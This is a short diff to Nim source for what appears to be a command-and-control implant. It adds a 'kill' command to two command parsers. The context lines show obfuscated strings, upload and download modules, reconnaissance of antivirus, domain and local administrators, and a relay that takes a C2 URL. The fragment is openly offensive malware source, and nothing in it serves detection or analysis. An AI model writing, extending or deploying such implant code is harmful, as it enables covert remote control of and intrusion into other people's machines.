@@ -10,7 +10,7 @@ include ../modules/filesystem/[cat, cd, cp, ls, mkdir, mv, pwd, rm]
 include ../modules/network/[curl, download, upload, wget]
 
 # System information and operations
-include ../modules/system/[env, getAv, getDom, getLocalAdm, ps, whoami]
+include ../modules/system/[env, getAv, getDom, getLocalAdm, ps, whoami, kill]
 
 # Execution operations
 include ../modules/execution/[run]
@@ -91,6 +91,8 @@ proc parseCmdRelay*(cmd : string, cmdGuid : string, args : seq[string]) : string
                         result = marker  # Special marker for main.nim to start server
                 except ValueError:
                     result = obf("ERROR: Invalid port number. Usage: relay <PORT> [parent_host:port] [c2_url]")
+        elif cmd == obf("kill"):
+            result = kill(args)
         else:
             when defined debug:
                 echo "[DEBUG] ❌ ┌─────────── CMDPARSER NO MATCH ───────────┐"
@@ -193,6 +195,8 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
                         result = marker  # Special marker for main.nim to start server
                 except ValueError:
                     result = obf("ERROR: Invalid port number. Usage: relay <PORT> [parent_host:port] [c2_url]")
+        elif cmd == obf("kill"):
+            result = kill(args)
         else:
             # Parse risky commands, if enabled
             when defined risky:
